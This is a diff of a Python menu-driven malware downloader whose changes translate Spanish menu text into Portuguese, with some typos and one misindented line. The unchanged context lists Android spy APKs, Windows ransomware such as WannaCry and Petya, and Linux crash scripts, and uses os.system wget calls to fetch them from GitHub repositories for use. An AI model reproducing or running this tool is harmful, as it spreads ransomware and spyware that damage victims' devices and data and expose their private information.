@@ -37,10 +37,10 @@ def android():
     print('[9] vi4a.apk')
     print('[10] Grave.apk')
     print('[11] Dendroid.apk')
-    print('[00] Volver al menu principal')
+    print('[00] Voltar ao menu princiapl')
     print('[99] Salir')
     
-    elegir2 = int(input('Selecciona una opcion :: '))
+    elegir2 = int(input('Selecione uma opcao:: '))
     if elegir2 == 1:
         os.system("wget https://github.com/Hacking-pch/papaviruz/raw/master/.Whatsapp-Spy.apk")
         os.system("mv '.Whatsapp-Spy.apk' Android/.Whatsapp-Spy.apk")
@@ -92,7 +92,7 @@ def android():
     elif elegir2 == 99:
           exit()
     else:
-        print('Error opcion invalida')
+        print('Opcao invalidade tente novamente ')
         time.sleep(3)
         os.system("clear")
         print(logo)
@@ -100,7 +100,7 @@ def android():
         
 def windows():
     print(' ')
-    print('\nIngresa una opcion')
+    print('\nEscolha uma das opces abaixo: ')
     print('[1] RansomwareFileDecryptor.exe')
     print('[2] Loop windows cmd')
     print('[3] RIP.bat')
@@ -110,9 +110,9 @@ def windows():
     print('[7] Petya Ransomware')
     print('[8] GoldenEye Petya Ransomware')
     print('[9] WannaCry Ransomware')
-    print('[00] Volver al menu principal')
-    print('[99] Salir')
-    elegir3 = int(input('Selecciona una opcion :: '))
+    print('[00] Voltar ao menu Principal ')
+    print('[99] Sair')
+    elegir3 = int(input('Selecione uma opcao : '))
     if elegir3 == 1:
         os.system("wget https://github.com/LOoLzeC/vcrt/raw/master/RansomwareFileDecryptor.exe")
         os.system("mv 'RansomwareFileDecryptor.exe' Windows/RansomwareFileDecryptor.exe")
@@ -164,13 +164,13 @@ def windows():
     
 def linux():
     print(' ')
-    print('\nIngresa una opcion')
+     print('\nEscolha uma das opces abaixo: ')
     print('[1] freeze.sh')
     print('[2] lil_virus.sh')
     print('[3] bootloop.sh')
-    print('[00] Volver al menu principal')
-    print('[99] Salir')
-    elegir4 = int(input('Selecciona una opcion :: '))
+    print('[00] Voltar ao menu Principal ')
+    print('[99] Sair')
+    elegir4 = int(input('Selecione uma opcao : '))
     if elegir4 == 1:
         os.system("wget https://github.com/Gameye98/V1RU5/raw/master/freeze.sh")
         os.system("mv 'freeze.sh' Linux/freeze.sh")
@@ -190,7 +190,7 @@ def linux():
     elif elegir4 == 99:
           exit()
     else:
-          print('Error opcion invalida')
+          print('Error opcao invalida')
           time.sleep(2)
           os.system("clear")
           print(logo)
@@ -198,12 +198,12 @@ def linux():
         
 print(logo)
 def inicio():
-    print('\nIngresa una opcion')
+    print('\nEscolha uma das opces abaixo: ')
     print('[1] Android')
     print('[2] Windows')
     print('[3] Linux')
-    print('[99] Salir')
-    elegir = int(input('Selecciona una opcion :: '))
+    print('[99] Sairr')
+    elegir = int(input('Selecione um dos sistemas abaixo : '))
     if elegir == 1:
         android()
     elif elegir == 2:
@@ -213,7 +213,7 @@ def inicio():
     elif elegir == 99:
        exit()
     else:
-       print('Error opcion invalida')
+       print('Error opcao invalida')
        time.sleep(2)
        os.system("clear")
        print(logo)
